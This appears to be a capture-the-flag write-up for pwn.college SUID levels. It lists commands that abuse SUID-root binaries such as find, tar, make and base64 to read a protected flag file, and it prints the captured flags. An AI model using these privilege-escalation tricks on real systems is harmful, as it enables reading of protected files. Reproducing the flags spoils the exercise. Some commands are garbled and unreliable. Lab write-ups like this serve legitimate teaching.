# Level 1/2/3/4/5/6/7/8/9 - SUID

```
> cd /challenge
> ls -al <name>
> ./babysuid_level1
> ./usr/bin/cat /flag
```

flag: `pwn.college{wnlOfJ8zdOdgVoWRP1zVwfkSYw1.QXzQTMsMTOwEzW}`

- https://www.gtk.org/setuid.html

# Level 10/11/12/13/14/15/17/18/19/20 - 

```
> ./rev /flag | rev
> od -An -c /flag | sed 's/ //g'
> hd /flag
> xxd /flag
> base32 /flag | base32 -d
> base64 /flag | base64 -d
> gzip flag | zcat flag.gz
> bzip2 -dc flag.bz2 
> zip /flag.zip /flag | unzip -p /flag.zip | more
> tar -czvf flag.tar.gz flag | tar - xzf flag.tar.gz -O
> genisoimage -sort /flag /flag

```
pwn.college{8xYlpa5rzmQwEm8rIX2d9DnVT6I.QXzUTMsMTOwEzW}
pwn.college{k1RNK7xKOgiE-ARIFRdBRVUxMQr.QX0UTMsMTOwEzW}
pwn.college{kNg9fS_AkM8YoaYgY4gMcjIs9dv.QX1UTMsMTOwEzW}
pwn.college{UwJZjNka1o3Y0POuE_7ZmVwLJpt.QXxYTMsMTOwEzW}
pwn.college{sERB6-QB1FG_LBNI_YtrZHdu5N4.QXyYTMsMTOwEzW}

# Level 24/25/27/28/29/30 - Using programs with SUID to execute other programs

```
> env cat flag
> find /flag -exec cat flag {} \;
> nice cat /flag
> timeout 100 cat /flag
> stdbuf -oL cat /flag

> setarch --list
> setarch uname26 cat /flag
```

# Level 26 - SUID with makefile

```
1. create makefile in directory which we have write access
run:
    cat /flag

2. execute makefile
> make run
```


